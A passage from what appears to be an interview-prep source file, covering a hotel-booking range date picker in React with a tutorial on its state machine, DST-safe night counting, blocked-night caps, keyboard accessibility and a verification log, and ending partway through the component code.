  return new Date(Date.UTC(y, m, d)).getUTCDay();
};
export const addDays = (iso: string, n: number) => {
  const { y, m, d } = parts(iso);
  return toISO(y, m, d + n);
};
// Jan 31 + 1 month is Feb 29 (2024), not Mar 2: clamp to the target month.
export const addMonths = (iso: string, n: number) => {
  const { y, m, d } = parts(iso);
  return toISO(y, m + n, Math.min(d, daysInMonth(y, m + n)));
};
// "Today" is the user's LOCAL calendar date, read once from the clock.
export const todayISO = () => {
  const now = new Date();
  return toISO(now.getFullYear(), now.getMonth(), now.getDate());
};
// 6 weeks x 7 days = 42 cells, starting on the weekStart before the 1st.
export function monthGrid(y: number, m: number, weekStart = 0): string[] {
  const first = toISO(y, m, 1);
  const lead = (weekday(first) - weekStart + 7) % 7;
  const start = addDays(first, -lead);
  return Array.from({ length: 42 }, (_, i) => addDays(start, i));
}
export const longLabel = (iso: string) => {
  const { y, m, d } = parts(iso);
  return WEEKDAYS[weekday(iso)] + ", " + MONTHS[m] + " " + d + ", " + y;
};
export const clamp = (
  iso: string,
  min?: string | null,
  max?: string | null,
): string => (min && iso < min ? min : max && iso > max ? max : iso);
`,
        },
      },
    },
  },
  // ══════════════════════════════════════════════════════════════════════════
  {
    title: "Build a Date Picker Calendar with Range Selection",
    seoDescription: "Build a two-month range date picker in React, Vue and Angular: start and end selection, hover preview, blocked nights, DST-safe night counts, keyboard.",
    description: `**Question presented to candidate:**
"We are a hotel booking site. Build the check-in / check-out calendar: two months side by side, the guest clicks a start date and an end date, and while they move the mouse we preview the stay. Some nights are already booked, and a stay can never include one. Tell the guest how many nights they picked, and make it work from the keyboard."

**Requirements:**
- Two consecutive months visible, with previous / next navigation and a \`min\` / \`max\` window.
- First pick sets check-in, second pick sets check-out; a pick before check-in restarts the range; a completed range restarts on the next pick.
- While choosing check-out, hovering or keyboard-focusing a day previews the range up to that day.
- Booked dates are not selectable, and the preview and check-out are capped at the night before the next booked date.
- A live status line: the next step, the latest allowed check-out, and finally "Tue, Mar 3 to Mon, Mar 9, 6 nights".
- Keyboard: arrows, Home / End, PageUp / PageDown move focus across both months (the view scrolls when focus leaves it), Enter selects, Escape cancels a half-made range. Emit \`[start, end]\` when complete.

**What a strong answer should cover:**
- A small selection state machine (no start, choosing end, complete) and a pure \`pick(range, day)\` function.
- Deriving cell states (start, end, in range, preview, unavailable) during render instead of storing them.
- Capping the range at the first blocked date after check-in (\`maxEnd\`), and disabling every later day while choosing.
- Counting nights with UTC day arithmetic: local midnights across a DST change are 23 or 25 hours apart, so dividing by 86,400,000 and rounding down with \`Math.floor\` is wrong.
- A roving tabindex that spans two grids, focus-driven preview for keyboard users, \`aria-selected\` on the range and a polite live region.

**Clarifying questions expected:**
- "Is the minimum stay one night, and is there a maximum stay?"
- "Can check-out fall on a booked date (the guest leaves that morning), or must every day of the range be free?"
- "Should clicking a date earlier than check-in move check-in, or swap the two?"

**Code / implementation expected:** Yes. A working two-month range picker; it may reuse the single-date picker's date helpers.`,
    frameworks: {
      react: {
        answer: `**Target Audience:** Candidates who can already build a single-date picker and want the harder range version. Assumes React state and effects.
**Difficulty:** Hard

> **How to read this doc:** Plain language first, then a <code>📌 Interview term:</code> callout with the exact vocabulary. Every line under "Verified" was printed by the real solution, mounted with React 19.3.1 in StrictMode inside jsdom and driven by a script, with \`TZ=America/New_York\` so a daylight saving change sits inside the test month.

## 1. Why This Even Matters — A Story First

Booking a hotel is a conversation. "I arrive Tuesday the 3rd." "And you leave?" The receptionist runs a finger along the calendar while you think, and stops you if your finger crosses a night that is already sold: "Sorry, the 12th is taken, the latest you can stay is until the morning of the 11th."

That running finger is the **hover preview**. The "sorry, taken" is the **blocked-night cap**. "That is six nights" is the **night count**. A range picker is a single-date picker plus that conversation. If you have not built the single-date version, start with [Build a Calendar / Date Picker](/interview-question/build-a-calendar-date-picker): this doc reuses its ideas (ISO date strings, UTC arithmetic, the 42-cell grid, roving tabindex) and spends its time on what is new.

## 2. Questions to Ask Your Interviewer First

| Question | Why it matters |
| :--- | :--- |
| Minimum and maximum stay? | A one-night minimum means check-out must be after check-in; a maximum adds a second cap next to the blocked one. |
| Can check-out land on a booked date? | Hotels often allow it (you leave that morning). This solution chooses the stricter rule: booked days are never selectable. |
| Click before check-in: move check-in or swap? | Changes \`pick()\`. Here it restarts the range from the earlier day, which is what most booking sites do. |
| One month or two? | Two months make cross-month ranges visible, and the keyboard focus has to travel between two grids. |
| Inline or popup? | Inline here. A popup adds the dialog pattern from the single-date question. |
| What is emitted, and when? | Here \`onChange([start, end])\` fires only when a range is complete. |

## 3. Requirements and Plan

### The selection state machine

<svg class="iq-diagram" width="100%" viewBox="0 0 680 220" role="img" aria-label="Selection states: no start, choosing end, and complete. Picking a day moves from no start to choosing end; picking a later free day completes; picking an earlier day restarts; Escape cancels; any pick after complete starts again">
  <defs>
    <marker id="rp2r-arrow" markerWidth="8" markerHeight="8" refX="5" refY="3" orient="auto">
      <path class="d-arrow" d="M0,0 L7,3 L0,6 Z"/>
    </marker>
  </defs>
  <rect class="d-box-muted" x="20" y="80" width="150" height="60" rx="10"/>
  <text class="d-text" x="95" y="105" text-anchor="middle">No start</text>
  <text class="d-sub" x="95" y="125" text-anchor="middle">start = null</text>
  <rect class="d-box-accent" x="265" y="80" width="150" height="60" rx="10"/>
  <text class="d-text d-accent" x="340" y="105" text-anchor="middle">Choosing end</text>
  <text class="d-sub" x="340" y="125" text-anchor="middle">preview on hover</text>
  <rect class="d-box" x="510" y="80" width="150" height="60" rx="10"/>
  <text class="d-text" x="585" y="105" text-anchor="middle">Complete</text>
  <text class="d-sub" x="585" y="125" text-anchor="middle">onChange fires</text>
  <path class="d-edge-accent" d="M 170 100 L 261 100" marker-end="url(#rp2r-arrow)"/>
  <text class="d-sub" x="215" y="88" text-anchor="middle">pick</text>
  <path class="d-edge-accent" d="M 415 100 L 506 100" marker-end="url(#rp2r-arrow)"/>
  <text class="d-sub" x="460" y="88" text-anchor="middle">pick later</text>
  <path class="d-edge-dashed" d="M 265 130 L 174 130" marker-end="url(#rp2r-arrow)"/>
  <text class="d-sub" x="220" y="160" text-anchor="middle">Escape</text>
  <path class="d-edge-dashed" d="M 310 80 C 310 30, 370 30, 370 76" marker-end="url(#rp2r-arrow)"/>
  <text class="d-sub" x="340" y="22" text-anchor="middle">pick earlier: restart</text>
  <path class="d-edge-dashed" d="M 585 140 C 585 205, 340 205, 340 144" marker-end="url(#rp2r-arrow)"/>
  <text class="d-sub" x="470" y="212" text-anchor="middle">pick again</text>
</svg>

The state is just \`{ start, end }\`; which "box" you are in is derived (\`choosingEnd = !!start && !end\`). The transitions live in one pure function, so they can be unit-tested without a DOM:

\`\`\`js
export function pick({ start, end }, iso, ctx) {
  if (ctx.isBlocked(iso)) return { start, end };
  // begin a new range
  if (!start || end || iso < start) return { start: iso, end: null };
  if (iso === start) return { start, end }; // need at least one night
  // would span a blocked date
  if (iso > ctx.maxEnd) return { start, end };
  return { start, end: iso };
}
\`\`\`

📌 **Interview term: Finite state machine** — a model with a small set of named states and explicit transitions. Writing the range picker as one makes edge cases (click before start, click after complete, Escape) a table you can read, instead of \`if\` statements scattered over handlers.

### State, derived values and refs

| Piece | Kind | Notes |
| :--- | :--- | :--- |
| \`range\` \`{ start, end }\` | State | The only selection state. |
| \`hover\` | State | The day under the mouse or keyboard focus while choosing the end. |
| \`focused\` | State | Roving tabindex target, can be in either month. |
| \`view\` | State | First day of the left month. Kept separately here, because clicking "next month" must scroll without moving focus. |
| \`maxEnd\` | Derived | Night before the first blocked date after \`start\` (or \`max\`). |
| \`previewEnd\` | Derived | \`hover\`, capped at \`maxEnd\`, only while choosing. |
| Cell state | Derived | \`"start" / "end" / "range" / "preview" / ""\` from the above, per cell, per render. |
| \`wantFocus\` | Ref | Move DOM focus after the next commit. |

The single-date picker derived the month from the focused day. Two months plus independent navigation buttons break that, so \`view\` becomes state, and a small rule keeps it honest: when focus moves outside the two visible months, scroll \`view\`.

## 4. Build It Step by Step

### 4.1 Reused date helpers, plus \`diffDays\`

Dates stay ISO strings; arithmetic stays in UTC. One new helper counts nights:

\`\`\`js
const utc = (iso) =>
  Date.UTC(+iso.slice(0, 4), +iso.slice(5, 7) - 1, +iso.slice(8, 10));
// exact: UTC days are always 24h
export const addDays = (iso, n) => fromUtc(utc(iso) + n * 86400000);
export const diffDays = (a, b) =>
  Math.round((utc(b) - utc(a)) / 86400000);
\`\`\`

Adding \`n * 86400000\` is safe **only because** the starting point is a UTC midnight. The same subtraction on local midnights is the classic bug. This Node 22 script compared the two:

\`\`\`text
TZ=America/New_York 2026-03-03 -> 2026-03-08: local-midnight diff 5 (floor 5) | diffDays 5
TZ=America/New_York 2026-03-07 -> 2026-03-09: local-midnight diff 1.9583333333333333 (floor 1) | diffDays 2
TZ=America/New_York 2026-10-31 -> 2026-11-02: local-midnight diff 2.0416666666666665 (floor 2) | diffDays 2
TZ=Europe/London 2026-03-07 -> 2026-03-09: local-midnight diff 2 (floor 2) | diffDays 2
\`\`\`

(Trimmed.) A two-night stay over the US spring-forward weekend is 47 hours of wall-clock time, so \`Math.floor\` charges one night. London changes clocks on a different date (29 March 2026), which is exactly why the bug survives testing in one zone.

📌 **Interview term: Wall-clock time vs elapsed time** — "two nights" is a calendar fact; "47 hours" is elapsed time. Mixing them breaks around DST. Temporal's \`PlainDate.until()\` counts calendar days directly ([Temporal and time zones](/interview-question/temporal-in-practice-how-do-you-correctly-handle-time-zones-dst-and-calendar-ari)).

\`monthCells(y, m)\` returns 42 entries with \`null\` for days outside the month. In a two-month view, showing 30 March in both April and March would be confusing, so out-of-month cells are blank \`role="presentation"\` cells.

### 4.2 The blocked-night cap

\`\`\`js
export function maxEndFor(start, blocked, max) {
  const next = blocked.filter((b) => b > start).sort()[0];
  const cap = next ? addDays(next, -1) : max;
  return max && cap && cap > max ? max : cap;
}
\`\`\`

ISO strings sort chronologically, so \`sort()[0]\` is the next booked date. While choosing the end, every day after \`maxEnd\` is treated as unavailable:

\`\`\`js
const unavailable = (iso) =>
  isBlocked(iso) || (choosingEnd && iso > maxEnd);
const previewEnd =
  choosingEnd && hover && hover > start
    ? hover > maxEnd
      ? maxEnd
      : hover
    : null;
\`\`\`

So hovering 20 March with check-in on the 5th and the 12th booked previews 6 to 11, never past the booked night. The status line tells the guest why: "(latest Wed, Mar 11)".

📌 **Interview term: Derived UI state** — cell flags such as "in range" or "preview" are computed from \`range\`, \`hover\` and \`maxEnd\` during render. Storing them would mean updating 84 cells by hand on every mouse move.

### 4.3 Cell states and ARIA

\`\`\`js
function stateOf(iso) {
  if (iso === start) return "start";
  if (iso === end) return "end";
  if (end && iso > start && iso < end) return "range";
  if (previewEnd && iso > start && iso <= previewEnd) return "preview";
  return "";
}
\`\`\`

\`\`\`jsx
<td key={iso} data-date={iso} data-state={st || undefined} className={"day " + st + (off ? " off" : "")}
  tabIndex={iso === visibleFocus ? 0 : -1}
  aria-label={shortLabel(iso) + (blocked.includes(iso) ? ", unavailable" : "")}
  aria-selected={st === "start" || st === "end" || st === "range"} aria-disabled={off || undefined}
  onClick={() => { setFocused(iso); choose(iso); }}>
\`\`\`

Each grid has \`aria-multiselectable="true"\` because several cells are selected at once. The preview is not \`aria-selected\` (it is not a selection yet); screen reader users hear it through the status line instead.

📌 **Interview term: Live region** — an element with \`role="status"\` / \`aria-live="polite"\` whose text changes are read out without moving focus. "Check-in Tue, Mar 3. Select a check-out date (latest Wed, Mar 11)." is both the visual hint and the screen reader announcement.

### 4.4 Hover and keyboard preview with one handler

Instead of 84 \`onMouseEnter\` handlers, one \`onMouseOver\` on the root reads the day from the event target ([event delegation](/interview-question/explain-event-delegation)):

\`\`\`js
function onOver(e) {
  const iso = e.target
    .closest?.("[data-date]")
    ?.getAttribute("data-date");
  if (iso && iso !== hover) setHover(iso);
}
\`\`\`

\`mouseover\` bubbles, so one listener sees every cell; the \`iso !== hover\` check skips re-renders while the mouse moves inside one cell. \`onMouseLeave\` on the root clears the preview.

Keyboard users get the same preview: moving focus also sets \`hover\`.

\`\`\`js
function moveFocus(iso) {
  if ((min && iso < min) || (max && iso > max)) return;
  const left = view.slice(0, 7),
    right = addMonths(view, 1).slice(0, 7);
  if (iso.slice(0, 7) < left)
    setView(iso.slice(0, 7) + "-01"); // scroll back
  else if (iso.slice(0, 7) > right)
    setView(addMonths(iso.slice(0, 7) + "-01", -1)); // scroll on
  setFocused(iso);
  setHover(iso); // keyboard users get the same preview as mouse users
  wantFocus.current = true;
}
\`\`\`

The \`useEffect\` that focuses \`[tabindex="0"]\` after the commit is the same pattern as the single-date picker.

### 4.5 One roving tabindex across two grids

Clicking "next month" can scroll the focused day out of view. Then no visible cell would have \`tabindex="0"\` and Tab would skip the calendar entirely. So the tabbable cell is derived:

\`\`\`js
const shown = [view.slice(0, 7), addMonths(view, 1).slice(0, 7)];
const visibleFocus = shown.includes(focused.slice(0, 7))
  ? focused
  : min && view < min
    ? min
    : view;
\`\`\`

The first draft fell back to \`view\` alone. The driver caught it: after scrolling back to March the tabbable day was 1 March, which is before \`min\` (2 March). The extra \`min\` check fixed it.

## 5. Verified

Mounted in jsdom with React 19.3.1 in StrictMode, \`initialMonth="2026-03-05"\`, \`min="2026-03-02"\`, booked nights 12, 13 and 27 March 2026, \`TZ=America/New_York\`. Hover is a real bubbling \`mouseover\` on the cell. Vue and Angular printed the same lines from the same driver:

\`\`\`text
TZ=America/New_York months: March 2026 | April 2026 | prev disabled: true
status: Select a check-in date.
click booked Mar 12 -> Select a check-in date.
click Mar 5 -> Check-in Thu, Mar 5. Select a check-out date (latest Wed, Mar 11).
hover Mar 9 -> preview: 03-06 03-07 03-08 03-09
hover Mar 20 -> preview: 03-06 03-07 03-08 03-09 03-10 03-11 | Mar 14 aria-disabled: true
mouse leaves -> preview: (none)
click Mar 3 (before start) -> Check-in Tue, Mar 3. Select a check-out date (latest Wed, Mar 11).
click Mar 9 -> Tue, Mar 3 to Mon, Mar 9, 6 nights. | range: 03-04 03-05 03-06 03-07 03-08 | onChange: 2026-03-03 to 2026-03-09
aria-selected cells: 03-03 03-04 03-05 03-06 03-07 03-08 03-09
Enter on 2026-03-09 -> Check-in Mon, Mar 9. Select a check-out date (latest Wed, Mar 11).
Right x3 -> focus 2026-03-12 | preview: 03-10 03-11
Enter on booked day -> Check-in Mon, Mar 9. Select a check-out date (latest Wed, Mar 11).
Escape -> Select a check-in date.
start Mar 28, Down -> focus 2026-04-04 | preview: 03-29 03-30 03-31 04-01 04-02 04-03 04-04
Enter -> Sat, Mar 28 to Sat, Apr 4, 7 nights. | onChange: 2026-03-28 to 2026-04-04
PageDown x2 -> focus 2026-06-04 | months: May 2026 | June 2026 | tabindex=0: 1
Prev x2 -> months: March 2026 | April 2026 | tabbable day: 2026-03-02
Clear -> Select a check-in date. | selected: 0
\`\`\`

Highlights: the hover preview stopped at 11 March (the cap), "click Mar 3" restarted the range, **3 to 9 March counts 6 nights across the DST change** (local-midnight math would have counted 5), keyboard focus on a booked day still previews but Enter does nothing, a range crossed from March into April, and PageDown scrolled the two-month view so the focused day stayed visible. The \`mouseleave\` was dispatched by the driver (jsdom has no pointer); the visual colours and layout at 360 px were not checked here.

## 6. Edge Cases and Accessibility

| Concern | Handling |
| :--- | :--- |
| Click before check-in | Restarts the range there (\`pick\`) |
| Same day twice | Ignored: at least one night |
| Range over a booked night | Impossible: days after \`maxEnd\` are unavailable while choosing |
| Night count over DST | \`diffDays\` in UTC |
| Focus scrolled out of view | \`visibleFocus\` keeps one visible, in-range day tabbable |
| Keyboard preview | Focus moves update \`hover\` |
| Announcements | \`role="status"\` live region with the next step |
| Unavailable days | \`aria-disabled\` plus ", unavailable" in the label for booked ones |

## 7. Common Pitfalls

- **Counting nights with local \`Date\` subtraction.** Verified above: floor(1.958) is 1.
- **Storing "in range" on cells.** Derive it; a stored flag goes stale on the first hover.
- **Letting the preview run past a booked night.** The guest picks a range you will then reject. Cap at \`maxEnd\` and say why.
- **One mouse handler per cell.** Use delegation on the root and skip same-day updates.
- **Forgetting keyboard users in the preview.** Focus changes should drive the same preview as hover.
- **No tabbable day after paging the view.** Derive the tabbable cell from what is visible and clamp it to \`min\`.

## 8. How to Answer in an Interview

<div style="background:#1c140a;border:2px solid #f9a825;border-radius:10px;padding:20px 24px;margin:20px 0;">

<div style="color:#ffca28;font-size:1.15em;font-weight:bold;margin-bottom:16px;">🎤 How to Answer in an Interview</div>

<div style="color:#e0a83e;font-size:0.8em;font-weight:bold;text-transform:uppercase;letter-spacing:0.6px;margin:0 0 10px 0;">The 60-Second Answer</div>

<blockquote style="border-left:3px solid #f9a825;margin:10px 0;padding:2px 0 2px 14px;color:#f0e2c8;">
<strong style="color:#ffca28;">1. Reuse:</strong> <span style="color:#f0e2c8;">"I will reuse the single-date helpers: ISO strings, UTC arithmetic and a 42-cell grid, rendered twice for two months."</span>
</blockquote>

<blockquote style="border-left:3px solid #f9a825;margin:10px 0;padding:2px 0 2px 14px;color:#f0e2c8;">
<strong style="color:#ffca28;">2. State machine:</strong> <span style="color:#f0e2c8;">"The only selection state is <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">start</code> and <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">end</code>; a pure <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">pick</code> function handles new range, restart, minimum one night and the blocked cap."</span>
</blockquote>

<blockquote style="border-left:3px solid #f9a825;margin:10px 0;padding:2px 0 2px 14px;color:#f0e2c8;">
<strong style="color:#ffca28;">3. Derived cells:</strong> <span style="color:#f0e2c8;">"Each cell state, start, end, range, preview or unavailable, is derived from <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">range</code>, <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">hover</code> and <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">maxEnd</code> during render."</span>
</blockquote>

<blockquote style="border-left:3px solid #f9a825;margin:10px 0;padding:2px 0 2px 14px;color:#f0e2c8;">
<strong style="color:#ffca28;">4. Preview:</strong> <span style="color:#f0e2c8;">"One delegated <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">mouseover</code> and every keyboard focus move set <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">hover</code>, capped at the night before the next booked date."</span>
</blockquote>

<blockquote style="border-left:3px solid #f9a825;margin:10px 0;padding:2px 0 2px 14px;color:#f0e2c8;">
<strong style="color:#ffca28;">5. Accessibility:</strong> <span style="color:#f0e2c8;">"A roving <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">tabindex</code> across both grids, <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">aria-selected</code> on the range, <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">aria-multiselectable</code>, and a live status line with the night count."</span>
</blockquote>

<div style="color:#e0a83e;font-size:0.8em;font-weight:bold;text-transform:uppercase;letter-spacing:0.6px;margin:22px 0 10px 0;border-top:1px solid #4a3a1a;padding-top:16px;">Follow-Up Questions to Expect</div>

<div style="background:#3d2810;border-radius:8px 8px 0 0;padding:10px 16px;margin:12px 0 0 0;">
<span style="color:#ff8a65;font-weight:bold;">❓ Q:</span> <span style="color:#ffe0b2;">How would you allow check-out on a booked date?</span>
</div>
<div style="background:#151a15;border:1px solid #f9a825;border-top:none;border-radius:0 0 8px 8px;padding:10px 16px;margin:0 0 14px 0;">
<span style="color:#66bb6a;font-weight:bold;">💡 A:</span> <span style="color:#d8d8d8;">Treat booked dates as booked nights: <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">maxEnd</code> becomes the booked date itself, and <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">isBlocked</code> only applies to check-in and to nights strictly inside the range. The state machine does not change.</span>
</div>

<div style="background:#3d2810;border-radius:8px 8px 0 0;padding:10px 16px;margin:0;">
<span style="color:#ff8a65;font-weight:bold;">❓ Q:</span> <span style="color:#ffe0b2;">How do you add a maximum stay?</span>
</div>
<div style="background:#151a15;border:1px solid #f9a825;border-top:none;border-radius:0 0 8px 8px;padding:10px 16px;margin:0 0 14px 0;">
<span style="color:#66bb6a;font-weight:bold;">💡 A:</span> <span style="color:#d8d8d8;">Take the minimum of two caps: <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">maxEndFor(start)</code> and <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">addDays(start, maxNights)</code>. The same <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">unavailable</code> and preview logic then covers both.</span>
</div>

<div style="background:#3d2810;border-radius:8px 8px 0 0;padding:10px 16px;margin:0;">
<span style="color:#ff8a65;font-weight:bold;">❓ Q:</span> <span style="color:#ffe0b2;">How do you avoid re-rendering on every mousemove?</span>
</div>
<div style="background:#151a15;border:1px solid #f9a825;border-top:none;border-radius:0 0 8px 8px;padding:10px 16px;margin:0 0 14px 0;">
<span style="color:#66bb6a;font-weight:bold;">💡 A:</span> <span style="color:#d8d8d8;"><code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">mouseover</code> only fires when the pointer enters a new element, and the <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">iso !== hover</code> guard skips duplicates. For heavier cells, memoise the cell component on its derived state.</span>
</div>

<div style="background:#3d2810;border-radius:8px 8px 0 0;padding:10px 16px;margin:0;">
<span style="color:#ff8a65;font-weight:bold;">❓ Q:</span> <span style="color:#ffe0b2;">How would you test the logic?</span>
</div>
<div style="background:#151a15;border:1px solid #f9a825;border-top:none;border-radius:0 0 8px 8px;padding:10px 16px;margin:0 0 14px 0;">
<span style="color:#66bb6a;font-weight:bold;">💡 A:</span> <span style="color:#d8d8d8;">Unit-test <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">pick</code> and <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">maxEndFor</code> as plain functions with a table of cases, run <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">diffDays</code> under several <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">TZ</code> values, then a component test for hover, Enter and focus.</span>
</div>

<div style="background:#3d2810;border-radius:8px 8px 0 0;padding:10px 16px;margin:0;">
<span style="color:#ff8a65;font-weight:bold;">❓ Q:</span> <span style="color:#ffe0b2;">Prices per night?</span>
</div>
<div style="background:#151a15;border:1px solid #f9a825;border-top:none;border-radius:0 0 8px 8px;padding:10px 16px;margin:0;">
<span style="color:#66bb6a;font-weight:bold;">💡 A:</span> <span style="color:#d8d8d8;">Fetch a price map for the visible window, show prices in cells, and sum <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">diffDays</code> worth of nights for the total; never derive nights from a price list length.</span>
</div>

</div>

## 9. Quick Glossary

| Term | Plain meaning |
| :--- | :--- |
| **Finite state machine** | Named states plus explicit transitions |
| **Wall-clock vs elapsed time** | Calendar nights versus hours on a stopwatch |
| **Derived UI state** | Cell flags computed during render |
| **Live region** | Text that screen readers announce when it changes |
| **Event delegation** | One listener on a parent reads the target of bubbling events |
| **Blocked-night cap** | The latest check-out before the next booked date |

---
**Conclusion:** A range picker adds a state machine and a preview to the single-date picker. Keep the selection as \`{ start, end }\`, push every rule into a pure \`pick\`, derive each cell's look from state, cap the preview at the next booked night, and count nights in UTC. The verified run shows the cap, the restart, a cross-month stay, and six correct nights across the US daylight saving weekend.`,
        files: {
          "/App.js": `import { useState } from "react";
import RangePicker from "./src/RangePicker";

const css = \`
  body { margin: 0; background: #0f1115; color: #e6e6e6; font-family: system-ui, sans-serif; }
  .page { max-width: 720px; margin: 0 auto; padding: 24px 16px; }
  .rp { position: relative; background: #171a21; border: 1px solid #2c3340; border-radius: 12px; padding: 12px; }
  .rp-nav { position: absolute; top: 10px; left: 8px; right: 8px; display: flex; justify-content: space-between; pointer-events: none; }
  .rp-nav button { pointer-events: auto; background: none; border: 0; color: #c9d1d9; font-size: 20px; width: 32px; height: 32px; border-radius: 6px; cursor: pointer; }
  .rp-nav button:disabled { opacity: .3; }
  .rp-months { display: flex; flex-wrap: wrap; gap: 16px; }
  .rp-month { flex: 1 1 260px; }
  .rp-month h3 { text-align: center; font-size: 15px; margin: 6px 0 10px; }
  table { width: 100%; border-collapse: collapse; }
  th { font-size: 12px; color: #8b949e; font-weight: 500; padding: 4px 0; }
  td.day { text-align: center; padding: 8px 0; font-size: 14px; cursor: pointer; }
  td.day:focus { outline: 2px solid #f9a825; outline-offset: -2px; }
  td.range { background: #3d2810; }
  td.preview { background: #2a2214; box-shadow: inset 0 0 0 1px #6b5320; }
  td.start, td.end { background: #f9a825; color: #1c140a; font-weight: 700; }
  td.start { border-radius: 8px 0 0 8px; } td.end { border-radius: 0 8px 8px 0; }
  td.off { color: #474e5a; text-decoration: line-through; cursor: not-allowed; }
  .rp-foot { display: flex; align-items: center; justify-content: space-between; gap: 12px; border-top: 1px solid #2c3340; margin-top: 8px; padding-top: 8px; }
  .rp-foot p { margin: 0; font-size: 14px; color: #c9d1d9; }
  .rp-foot button { background: #222834; color: #e6e6e6; border: 1px solid #2c3340; border-radius: 8px; padding: 6px 12px; cursor: pointer; }
  .out { color: #9aa4b2; font-size: 14px; }
\`;

const BOOKED = ["2026-03-12", "2026-03-13", "2026-03-27"];

export default function App() {
  const [stay, setStay] = useState(null);
  return (
    <main className="page">
      <style>{css}</style>
      <h1 style={{ fontSize: 18 }}>Book your stay</h1>
      <RangePicker
        initialMonth="2026-03-05"
        min="2026-03-02"
        max="2026-12-31"
        blocked={BOOKED}
        onChange={setStay}
      />
      <p className="out" data-testid="out">
        onChange: {stay ? stay.join(" to ") : "nothing yet"}
      </p>
    </main>
  );
}
`,
          "/src/dates.js": `// Calendar dates are ISO strings "YYYY-MM-DD": they compare with < and >,
// work as keys, and carry no time zone. Arithmetic goes through Date.UTC,
// which has no daylight-saving gaps.
export const MONTHS = [
  "January",
  "February",
  "March",
  "April",
  "May",
  "June",
  "July",
  "August",
  "September",
  "October",
  "November",
  "December",
];
export const DAYS = ["Sun", "Mon", "Tue", "Wed", "Thu", "Fri", "Sat"];

const pad = (n) => String(n).padStart(2, "0");
const utc = (iso) =>
  Date.UTC(+iso.slice(0, 4), +iso.slice(5, 7) - 1, +iso.slice(8, 10));
const fromUtc = (ms) => {
  const t = new Date(ms);
  return (
    t.getUTCFullYear() +
    "-" +
    pad(t.getUTCMonth() + 1) +
    "-" +
    pad(t.getUTCDate())
  );
};
export const toISO = (y, m, d) => fromUtc(Date.UTC(y, m, d));
// exact: UTC days are always 24h
export const addDays = (iso, n) => fromUtc(utc(iso) + n * 86400000);
export const diffDays = (a, b) => Math.round((utc(b) - utc(a)) / 86400000);
export const weekday = (iso) => new Date(utc(iso)).getUTCDay();
export const monthOf = (iso) => ({
  y: +iso.slice(0, 4),
  m: +iso.slice(5, 7) - 1,
});
export const addMonths = (iso, n) => {
  const { y, m } = monthOf(iso);
  const last = new Date(Date.UTC(y, m + n + 1, 0)).getUTCDate();
  return toISO(y, m + n, Math.min(+iso.slice(8, 10), last));
};
export const shortLabel = (iso) =>
  DAYS[weekday(iso)] +
  ", " +
  MONTHS[+iso.slice(5, 7) - 1].slice(0, 3) +
  " " +
  +iso.slice(8, 10);
// 42 cells; days outside the month are null (a two-month view hides them).
export function monthCells(y, m) {
  const first = toISO(y, m, 1);
  const lead = weekday(first);
  const len = new Date(Date.UTC(y, m + 1, 0)).getUTCDate();
  return Array.from({ length: 42 }, (_, i) =>
    i < lead || i >= lead + len ? null : addDays(first, i - lead),
  );
}

// Range rules shared by every framework version.
// The furthest check-out allowed: the night
// before the first blocked date after start.
export function maxEndFor(start, blocked, max) {
  const next = blocked.filter((b) => b > start).sort()[0];
  const cap = next ? addDays(next, -1) : max;
  return max && cap && cap > max ? max : cap;
}
// What a click (or Enter) on \`iso\` does to the current selection.
export function pick({ start, end }, iso, ctx) {
  if (ctx.isBlocked(iso)) return { start, end };
  // begin a new range
  if (!start || end || iso < start) return { start: iso, end: null };
  if (iso === start) return { start, end }; // need at least one night
  if (iso > ctx.maxEnd) return { start, end }; // would span a blocked date
  return { start, end: iso };
}
`,
          "/src/RangePicker.js": `import { useEffect, useRef, useState } from "react";
import {
  DAYS,
  MONTHS,
  addDays,
  addMonths,
  diffDays,
  maxEndFor,
  monthCells,
  monthOf,
  pick,
  shortLabel,
  toISO,
  weekday,
} from "./dates";

export default function RangePicker({
  min,
  max,
  blocked = [],
  initialMonth,
  onChange,
}) {
  const [range, setRange] = useState({ start: null, end: null });
  // preview end while choosing check-out
  const [hover, setHover] = useState(null);
  // roving tabindex target
  const [focused, setFocused] = useState(initialMonth);
  // left month
  const [view, setView] = useState(initialMonth.slice(0, 7) + "-01");
  const wantFocus = useRef(false);
  const rootRef = useRef(null);

  const { start, end } = range;
  const choosingEnd = !!start && !end;
  const maxEnd = choosingEnd ? maxEndFor(start, blocked, max) : null;
  const isBlocked = (iso) =>
    blocked.includes(iso) || (min && iso < min) || (max && iso > max);
  const unavailable = (iso) => isBlocked(iso) || (choosingEnd && iso > maxEnd);
  const previewEnd =
    choosingEnd && hover && hover > start
      ? hover > maxEnd
        ? maxEnd
        : hover
      : null;
  const months = [view, addMonths(view, 1)].map(monthOf);

  function stateOf(iso) {
    if (iso === start) return "start";
    if (iso === end) return "end";
    if (end && iso > start && iso < end) return "range";
    if (previewEnd && iso > start && iso <= previewEnd) return "preview";
    return "";
  }

  function choose(iso) {
    const next = pick(range, iso, { isBlocked, maxEnd });
    if (next === range || (next.start === start && next.end === end)) return;
    setRange(next);
    setHover(null);
    if (next.end) onChange?.([next.start, next.end]);
  }

  function moveFocus(iso) {
